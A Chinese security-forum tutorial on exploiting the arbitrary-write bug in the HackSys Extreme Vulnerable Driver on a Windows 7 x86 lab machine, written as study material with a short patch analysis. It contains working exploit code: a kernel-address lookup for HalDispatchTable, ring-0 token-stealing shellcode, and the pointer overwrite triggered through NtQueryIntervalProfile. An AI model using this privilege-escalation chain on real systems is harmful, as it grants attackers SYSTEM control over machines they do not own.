> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-270083.htm)

> [原创] 内核漏洞学习 [4]-HEVD-ArbitraryWrite

HEVD-ArbitraryWrite
===================

一： 概述
-----

HEVD：漏洞靶场，包含各种 Windows 内核漏洞的驱动程序项目，在 Github 上就可以找到该项目，进行相关的学习

 

[Releases · hacksysteam/HackSysExtremeVulnerableDriver · GitHub](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases)

> 环境准备：
> 
> Windows 7 X86 sp1 虚拟机
> 
> 使用 VirtualKD 和 windbg 双机调试
> 
> HEVD 3.0+KmdManager+DubugView

 

这个漏洞相对来说不算难。没有什么太多的前置知识。

[](#二：漏洞点分析)二：漏洞点分析
-------------------

分析 ArbitraryWrite.c 源码， What = UserWriteWhatWhere->What;Where = UserWriteWhatWhere->Where; 这两个指针，没有验证地址是否有效，直接拿来进行读写操作，在内核模式下，对不该访问的地址进行读写，会蓝屏。。

 

安全版本检查内存是否正确：

```
// ProbeForRead函数，检查用户模式缓冲区是否实际驻留在地址空间的用户部分中，并且正确对齐，（msdn）
//ProbeForwrite常规检查用户模式缓冲区是否实际位于地址空间的用户模式部分，是可行的，并且正确对齐。（msdn）

```

```
NTSTATUS
TriggerArbitraryWrite(
    _In_ PWRITE_WHAT_WHERE UserWriteWhatWhere
)
{
    PULONG_PTR What = NULL;
    PULONG_PTR Where = NULL;
    NTSTATUS Status = STATUS_SUCCESS;
 
    PAGED_CODE();
 
    __try
    {
 
 
        ProbeForRead((PVOID)UserWriteWhatWhere, sizeof(WRITE_WHAT_WHERE), (ULONG)__alignof(UCHAR));
 
        What = UserWriteWhatWhere->What;
        Where = UserWriteWhatWhere->Where;
 
        DbgPrint("[+] UserWriteWhatWhere: 0x%p\n", UserWriteWhatWhere);
        DbgPrint("[+] WRITE_WHAT_WHERE Size: 0x%X\n", sizeof(WRITE_WHAT_WHERE));
        DbgPrint("[+] UserWriteWhatWhere->What: 0x%p\n", What);
        DbgPrint("[+] UserWriteWhatWhere->Where: 0x%p\n", Where);
 
#ifdef SECURE
 
    //安全版本，对地址进行验证，是否有效。
 
 
        ProbeForRead((PVOID)What, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR));
        ProbeForWrite((PVOID)Where, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR));
 
        *(Where) = *(What);
#else
        DbgPrint("[+] Triggering Arbitrary Write\n");
 
 
 
        *(Where) = *(What);
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
 
 
    return Status;
}

```

[](#三：漏洞利用)三：漏洞利用
-----------------

在不安全的版本中，没有对两个指针 what 和 where 指向的地址进行验证，那我们可以利用这点，让指针访问我们的 shellcode 的位置，执行 shellcode 从而提取。

 

那么现在的问题就是 what 和 where 中写入什么内容，如何访问执行到我们的 shellocde。

 

1. 存在漏洞的 ArbitraryWriteIoctlHandler 函数对应的 IO 控制码 **HEVD_IOCTL_ARBITRARY_WRITE**

```
case HEVD_IOCTL_ARBITRARY_WRITE:
            DbgPrint("****** HEVD_IOCTL_ARBITRARY_WRITE ******\n");
            Status = ArbitraryWriteIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_ARBITRARY_WRITE ******\n");
            break;

```

2._WRITE_WHAT_WHERE 结构，8 个字节大小，what 和 where 各占四个字节。所以先构造一个大小为 8 的 buf，修改 what 和 where 指针，**实现任意地址写**

```
typedef struct _WRITE_WHAT_WHERE
{
    PULONG_PTR What;
    PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

```

3. 任意地址写测试

```
#include #include typedef struct _WRITE_WHAT_WHERE
{
    PULONG_PTR What;
    PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;
 
int main()
{
    PWRITE_WHAT_WHERE Buffer;
    Buffer = (WRITE_WHAT_WHERE*)malloc(sizeof(WRITE_WHAT_WHERE));
    ZeroMemory(Buffer, sizeof(WRITE_WHAT_WHERE));
    Buffer->Where = (PULONG_PTR)0x41414141;
    Buffer->What = (PULONG_PTR)0x41414141;
    DWORD recvBuf;
    // 获取句柄
    HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        NULL,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL);
 
 
    if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
    {
        printf("Failed \n");
        return 0;
    }
 
 
    DeviceIoControl(hDevice, HEVD_IOCTL_ARBITRARY_WRITE, Buffer, 8, NULL, 0, &recvBuf, NULL);
 
    return 0;
} 
```

运行，触发漏洞。

 

![](https://img-blog.csdnimg.cn/img_convert/c415d98b34b0014e8f5eefe138c6e227.png)

 

4. 任意代码执行测试

 

上述的测试已经实现任意地址写，我们将 shellcode 写入，如何实现执行 payload 呢。

 

首先要 what 指针覆盖为 payload 的地址, where 指针修改为能指向 payload 地址的指针

```
what -> &payload
where -> HalDispatchTable+0x4

```

前人已经发现了 windows 不常被使用的一个函数，利用函数 NtQueryIntervalProfile，可以实现 shellcode 的执行，达到任意代码执行效果

 

windbg 反汇编 NtQueryIntervalProfile 函数

```
kd> uf nt!NtQueryIntervalProfile
.........
84160ecd 7507            jne     nt!NtQueryIntervalProfile+0x6b (84160ed6)  Branch
 
nt!NtQueryIntervalProfile+0x64:
84160ecf a1acebf783      mov     eax,dword ptr [nt!KiProfileInterval (83f7ebac)]
84160ed4 eb05            jmp     nt!NtQueryIntervalProfile+0x70 (84160edb)  Branch
 
nt!NtQueryIntervalProfile+0x6b:
84160ed6 e83ae5fbff      call    nt!KeQueryIntervalProfile (8411f415)
 
.........

```

84160ed6 处 会调用函数 KeQueryIntervalProfile，反编译此函数

```
kd>uf nt!KeQueryIntervalProfile
..........
nt!KeQueryIntervalProfile+0x14:
8411f429 8945f0          mov     dword ptr [ebp-10h],eax
8411f42c 8d45fc          lea     eax,[ebp-4]
8411f42f 50              push    eax
8411f430 8d45f0          lea     eax,[ebp-10h]
8411f433 50              push    eax
8411f434 6a0c            push    0Ch
8411f436 6a01            push    1
8411f438 ff15fcf3f783    call    dword ptr [nt!HalDispatchTable+0x4 (83f7f3fc)]
8411f43e 85c0            test    eax,eax
8411f440 7c0b            jl      nt!KeQueryIntervalProfile+0x38 (8411f44d)  Branch
 
..........

```

8411f438 处， 有指针数组，call dword ptr [nt!HalDispatchTable+0x4 ，这里就是我们 payload 要覆盖的地方，执行 Ring0 Shellcode 的主体必须是 Ring0 程序。这种利用方法是这样的：设法修改内核 API 导出表（如 SSDT、HalDispatchTable 等），将内核 API 函数指针修改为事先准备好的 Shellcode 地址，然后在本进程中调用这个内核 API。最好选择劫持那些冷门内核 API 函数，否则一旦别的进程也调用这个 API，由于 Shellcode 只保存在当前进程的 Ring3 内存地址中，别的进程无法访问到，将导致内存访问错误或内核崩溃。

 

利用漏洞将 HalDispatchTable 表第一个函数 HalQuerySystemInformation 入口地址篡改，，最后调用该函数的上层封装函数`NtWueryIntervalProfile`，从而执行 Ring0 Shellcode

 

HalDispatchTable 结构：

```
HAL_DISPATCH HalDispatchTable = {
    HAL_DISPATCH_VERSION,
    xHalQuerySystemInformation,//此处
    xHalSetSystemInformation,
    xHalQueryBusSlots,
    xHalDeviceControl,
    xHalExamineMBR,
    xHalIoAssignDriveLetters,
    xHalIoReadPartitionTable,
    xHalIoSetPartitionInformation,
    xHalIoWritePartitionTable,
    xHalHandlerForBus,                  // HalReferenceHandlerByBus
    xHalReferenceHandler,               // HalReferenceBusHandler
    xHalReferenceHandler                // HalDereferenceBusHandler
    };

```

在查 HalDispatchTable 结构，NtQueryIntervalProfile 函数的过程中，发现这个利用有很多，可以更进一步学习。

### 利用过程

> 1.  获取 HalDispatchTable 地址 + 0x4 地址
>     
> 2.  编写 Ring0 payload
>     
> 3.  利用漏洞向 HalDispatchTable 地址 + 0x4 地址处写入 & payload
>     
> 4.  调用`NtQueryIntervalProfile`，执行 payload
>     

#### 1. 获取 HalDispatchTable 地址 + 0x4 地址

思路是先得到内核模块基址，将其与 HalDispatchTable 在内核模块中的偏移相加

> 获取 ntkrnlpa.exe 基址，在内核模式下  
> ntkrnlpa.exe 基址，在用户模式下  
> HalDispatchTable 地址，在用户模式下  
> 计算 HalDispatchTable+0x4 的地址，利用偏移，地址是内核模式下

 

官方给出的函数 HalDispatchTable = GetHalDispatchTable();

```
PVOID GetHalDispatchTable() {
    PCHAR KernelImage;
    SIZE_T ReturnLength;
    HMODULE hNtDll = NULL;
    PVOID HalDispatchTable = NULL;
    HMODULE hKernelInUserMode = NULL;
    PVOID KernelBaseAddressInKernelMode;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;
 
    hNtDll = LoadLibrary("ntdll.dll");
 
    if (!hNtDll) {
        DEBUG_ERROR("\t\t\t[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
 
    NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");
 
    if (!NtQuerySystemInformation) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtQuerySystemInformation: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
 
    NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);
 
    // Allocate the Heap chunk
    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),
                                                                     HEAP_ZERO_MEMORY,
                                                                     ReturnLength);
 
    if (!pSystemModuleInformation) {
        DEBUG_ERROR("\t\t\t[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    NtStatus = NtQuerySystemInformation(SystemModuleInformation,
                                        pSystemModuleInformation,
                                        ReturnLength,
                                        &ReturnLength);
 
    if (NtStatus != STATUS_SUCCESS) {
        DEBUG_ERROR("\t\t\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
 
    KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
    KernelImage = strrchr((PCHAR)(pSystemModuleInformation->Module[0].ImageName), '\\') + 1;
 
    DEBUG_INFO("\t\t\t[+] Loaded Kernel: %s\n", KernelImage);
    DEBUG_INFO("\t\t\t[+] Kernel Base Address: 0x%p\n", KernelBaseAddressInKernelMode);
 
    hKernelInUserMode = LoadLibraryA(KernelImage);
 
    if (!hKernelInUserMode) {
        DEBUG_ERROR("\t\t\t[-] Failed To Load Kernel: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
 
    // This is still in user mode
    HalDispatchTable = (PVOID)GetProcAddress(hKernelInUserMode, "HalDispatchTable");
 
    if (!HalDispatchTable) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving HalDispatchTable: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        HalDispatchTable = (PVOID)((ULONG_PTR)HalDispatchTable - (ULONG_PTR)hKernelInUserMode);
 
        // Here we get the address of HapDispatchTable in Kernel mode
        HalDispatchTable = (PVOID)((ULONG_PTR)HalDispatchTable + (ULONG_PTR)KernelBaseAddressInKernelMode);
 
        DEBUG_INFO("\t\t\t[+] HalDispatchTable: 0x%p\n", HalDispatchTable);
    }
 
    HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);
 
    if (hNtDll) {
        FreeLibrary(hNtDll);
    }
 
    if (hKernelInUserMode) {
        FreeLibrary(hKernelInUserMode);
    }
 
    hNtDll = NULL;
    hKernelInUserMode = NULL;
    pSystemModuleInformation = NULL;
 
    return HalDispatchTable;
}

```

#### 2. 编写 Ring0 payload

payload 功能：遍历进程，得到系统进程的 token，把当前进程的 token 替换，达到提权目的。

 

相关内核结构体：

 

在内核模式下，fs:[0] 指向 KPCR 结构体

```
_KPCR
+0x120 PrcbData         : _KPRCB
_KPRCB
+0x004 CurrentThread    : Ptr32 _KTHREAD，_KTHREAD指针，这个指针指向_KTHREAD结构体
_KTHREAD
+0x040 ApcState         : _KAPC_STATE
_KAPC_STATE
+0x010 Process          : Ptr32 _KPROCESS,_KPROCESS指针，这个指针指向EPROCESS结构体
_EPROCESS
   +0x0b4 UniqueProcessId  : Ptr32 Void,当前进程ID，系统进程ID=0x04
   +0x0b8 ActiveProcessLinks : _LIST_ENTRY，双向链表，指向下一个进程的ActiveProcessLinks结构体处，通过这个链表我们可以遍历所有进程，以寻找我们需要的进程
   +0x0f8 Token            : _EX_FAST_REF，描述了该进程的安全上下文，同时包含了进程账户相关的身份以及权限

```

payload：

```
__asm {
       pushad                               ; Save registers state
 
       ; Start of Token Stealing Stub
       xor eax, eax                         ; Set ZERO
       mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                            ; _KTHREAD is located at FS:[0x124]
 
       mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process
 
       mov ecx, eax                         ; Copy current process _EPROCESS structure
 
       mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4
 
       SearchSystemPID:
           mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
           sub eax, FLINK_OFFSET
           cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
           jne SearchSystemPID
 
       mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
       mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                            ; with SYSTEM process nt!_EPROCESS.Token
       ; End of Token Stealing Stub
 
       popad                                ; Restore registers state
   }

```

#### 3. 利用漏洞向 HalDispatchTable 地址 + 0x4 地址处写入 & payload

```
HalDispatchTable+0x4地址：
HalDispatchTablePlus4 = (PVOID)((ULONG_PTR)HalDispatchTable + sizeof(PVOID));
 
WriteWhatWhere->What = (PULONG_PTR)&EopPayload;
WriteWhatWhere->Where = (PULONG_PTR)HalDispatchTablePlus4;

```

#### 4. 调用 NtQueryIntervalProfile 函数，执行 payload

```
hNtDll = LoadLibrary("ntdll.dll");
 NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hNtDll, "NtQueryIntervalProfile");
 NtQueryIntervalProfile(0x1337, &Interval);

```

运行 exp，提权成功：

 

![](https://img-blog.csdnimg.cn/img_convert/a6fb2f50ce55c3082b2fa44b0a79aa52.png)

[](#五：补丁分析)五：补丁分析
-----------------

在安全版本中已经给出，对 what 和 where 指针进行验证，robeForRead 函数，ProbeForwrite 函数，通过验证在进行操作

 

其他

 

参考链接：

 

[0day 安全 | Chapter 22 内核漏洞利用技术 (wohin.me)](https://wohin.me/0dayan-quan-chapter-22-nei-he-lou-dong-li-yong-ji-zhu/)

 

TJ：https://bbs.pediy.com/thread-252506.htm#msg_header_h2_2  
........

[【公告】【iPhone 13 大奖等你拿】看雪. 众安 2021 KCTF 秋季赛 防守篇 - 征题倒计时（11 月 14 日截止）！](https://bbs.pediy.com/thread-269228.htm)

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#Windows](forum-150-1-160.htm)